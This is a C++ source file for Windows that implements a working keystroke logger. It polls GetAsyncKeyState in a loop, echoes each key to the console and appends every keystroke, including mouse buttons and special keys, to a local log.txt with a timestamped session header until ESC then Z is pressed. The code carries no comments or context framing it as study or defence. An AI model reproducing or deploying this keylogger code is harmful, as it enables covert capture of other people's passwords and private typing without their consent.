#include <iostream>
#include <Windows.h>
#include <fstream>
#include <time.h>

using namespace std;

bool caps = false;

int Save(int _key, char *file) {

    ofstream f(file,ios::app);
    switch(_key) {
        case VK_SHIFT:
            cout<< "key stroke: "<<"[SHIFT]"<<endl;
            f << "key stroke: "<<"[SHIFT]"<<"("<<_key<<")"<<endl;
        break;
        case VK_TAB:
            cout<< "key stroke: "<<"[TAB]"<<endl;
            f << "key stroke: "<<"[TAB]"<<"("<<_key<<")"<<endl;
        break;
        case VK_BACK:
            cout<< "key stroke: "<<"[BACKSPACE]"<<endl;
            f << "key stroke: "<<"[BACKSPACE]"<<"("<<_key<<")"<<endl;
        break;
        case VK_LBUTTON:
            cout<< "key stroke: "<<"[LMB]"<<endl;
            f << "key stroke: "<<"[LMB]"<<"("<<_key<<")"<<endl;
        break;
        case VK_RBUTTON:
            cout<< "key stroke: "<<"[RMB]"<<endl;
            f << "key stroke: "<<"[RMB]"<<"("<<_key<<")"<<endl;
        break;
        case VK_MBUTTON:
            cout<< "key stroke: "<<"[MMB]"<<endl;
            f << "key stroke: "<<"[MMB]"<<"("<<_key<<")"<<endl;
        break;
        case VK_RETURN:
            cout<< "key stroke: "<<"[VK_RETURN]"<<endl;
            f << "key stroke: "<<"[VK_RETURN]"<<"("<<_key<<")"<<endl;
        break;
        case VK_CONTROL:
            cout<< "key stroke: "<<"[CTRL]"<<endl;
            f << "key stroke: "<<"[CTRL]"<<"("<<_key<<")"<<endl;
        break;
        case VK_MENU:
            cout<< "key stroke: "<<"[ALT]"<<endl;
            f << "key stroke: "<<"[ALT]"<<"("<<_key<<")"<<endl;
        break;
        case VK_CAPITAL:
            caps=!caps;
            if(caps) {
                cout<< "key stroke: "<<"[CAPS_ENABLED]"<<endl;
                f << "key stroke: "<<"[CAPS_ENABLED]"<<"("<<_key<<")"<<endl;
            }
            else {
                cout<< "key stroke: "<<"[CAPS_DISABLED]"<<endl;
                f << "key stroke: "<<"[CAPS_DISABLED]"<<"("<<_key<<")"<<endl;
            }
        break;
        case VK_ESCAPE:
            cout<< "key stroke: "<<"[ESC]"<<endl;
            f << "key stroke: "<<"[ESC]"<<"("<<_key<<")"<<endl;
        break;
        case VK_SPACE:
            cout<< "key stroke: "<<"[SPACE]"<<endl;
            f << "key stroke: "<<"[SPACE]"<<"("<<_key<<")"<<endl;
        break;
        case VK_PRIOR:
            cout<< "key stroke: "<<"[PGUP]"<<endl;
            f << "key stroke: "<<"[PGUP]"<<"("<<_key<<")"<<endl;
        break;
        case VK_NEXT:
            cout<< "key stroke: "<<"[PGDOWN]"<<endl;
            f << "key stroke: "<<"[PGDOWN]"<<"("<<_key<<")"<<endl;
        break;
        case VK_END:
            cout<< "key stroke: "<<"[END]"<<endl;
            f << "key stroke: "<<"[END]"<<"("<<_key<<")"<<endl;
        break;
        case VK_HOME:
            cout<< "key stroke: "<<"[HOME]"<<endl;
            f << "key stroke: "<<"[HOME]"<<"("<<_key<<")"<<endl;
        break;
        case VK_LEFT:
            cout<< "key stroke: "<<"[LEFT]"<<endl;
            f << "key stroke: "<<"[LEFT]"<<"("<<_key<<")"<<endl;
        break;
        case VK_RIGHT:
            cout<< "key stroke: "<<"[RIGHT]"<<endl;
            f << "key stroke: "<<"[RIGHT]"<<"("<<_key<<")"<<endl;
        break;
        case VK_UP:
            cout<< "key stroke: "<<"[UP]"<<endl;
            f << "key stroke: "<<"[UP]"<<"("<<_key<<")"<<endl;
        break;
        case VK_DOWN:
            cout<< "key stroke: "<<"[DOWN]"<<endl;
            f << "key stroke: "<<"[DOWN]"<<"("<<_key<<")"<<endl;
        break;
        case VK_INSERT:
            cout<< "key stroke: "<<"[INS]"<<endl;
            f << "key stroke: "<<"[INS]"<<"("<<_key<<")"<<endl;
        break;
        case VK_DELETE:
            cout<< "key stroke: "<<"[DEL]"<<endl;
            f << "key stroke: "<<"[DEL]"<<"("<<_key<<")"<<endl;
        break;
        default:
            cout<<"key stroke: "<<(char)_key<<"("<<_key<<")"<<endl;
            f << "key stroke: "<<(char)_key<<"("<<_key<<")"<<endl;
    }


    f.close();
    
}

int main() {
    char i;
    int esc = 27, Z=90, exit[2], ptr=0;

    time_t t = time(NULL);
    ofstream f("log.txt",ios::app);
    f << "\n\n\nNew session " << ctime(&t) << endl;
    f.close();


    while(true) {
        for( i=8;i<=255;i++) {
            if(GetAsyncKeyState(i)==-32767) {
                if(ptr==2) {
                    ptr=0;
                }
                exit[ptr]=i;
                ptr++;
                Save(i, "log.txt");
                if(exit[0] == esc && exit[1] == Z){

                    ofstream f("log.txt",ios::app);
                    f << "------------------------SESSION TERMINATED---------------------"<<endl;
                    f.close();
                    printf("exiting");
                    return 0;
                }
            }
        }
    }

}

